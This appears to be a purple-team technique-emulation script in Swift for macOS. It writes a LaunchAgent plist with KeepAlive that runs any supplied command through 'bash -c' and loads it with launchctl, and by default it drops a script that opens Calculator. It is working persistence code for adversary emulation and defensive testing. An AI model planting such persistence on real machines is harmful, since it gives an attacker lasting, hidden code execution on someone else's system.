import Foundation

print("This TTP will create LaunchAgent persistence to call a provided shell script.")

var retString = ""

let fileMan = FileManager.default
let username = NSUserName()
print(" ===> Attempting to drop LaunchAgent persistence...")

// Get the command_or_path from the command line argument
let commandOrPath = CommandLine.arguments[1]

if commandOrPath == "/Users/Shared/calc.sh" {
    let script = """
    #!/bin/bash
    open -a Calculator.app
    """

    let script2 = Data(script.utf8)
    try fileMan.createFile(atPath: commandOrPath, contents: script2, attributes: nil)

    var attributes = [FileAttributeKey: Any]()
    attributes[.posixPermissions] = 0o755
    try fileMan.setAttributes(attributes, ofItemAtPath: commandOrPath)
}

let plist = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.purpleteam.plist</string>
    <key>ProgramArguments</key>
    <array>
        <string>bash</string>
        <string>-c</string>
        <string>\(commandOrPath)</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

let plist2 = Data(plist.utf8)

var isDir = ObjCBool(true)

if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents", isDirectory: &isDir) {
    print("/Users/\(username)/Library/LaunchAgents directory is already present, so writing plist...")
    try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.purpleteam.plist", contents: plist2, attributes: nil)
} else {
    print("/Users/\(username)/Library/LaunchAgents directory is not present, so creating that directory and then writing the plist...")
    try fileMan.createDirectory(at: URL(fileURLWithPath: "/Users/\(username)/Library/LaunchAgents"), withIntermediateDirectories: false)
    try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.purpleteam.plist", contents: plist2, attributes: nil)
}

let proc = Process()
proc.launchPath = "/bin/launchctl"
let args: [String] = ["load", "-w", "/Users/\(username)/Library/LaunchAgents/com.purpleteam.plist"]
proc.arguments = args
let pipe = Pipe()
proc.standardOutput = pipe
proc.launch()
let results = pipe.fileHandleForReading.readDataToEndOfFile()
let output = String(data: results, encoding: String.Encoding.utf8)!

if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents/com.purpleteam.plist") {
    retString = "[+] Successfully loaded com.purpleteam.plist"
    print(retString)
} else {
    retString = "[!] This TTP failed to execute. Launch Agent not created"
    print(retString)
}
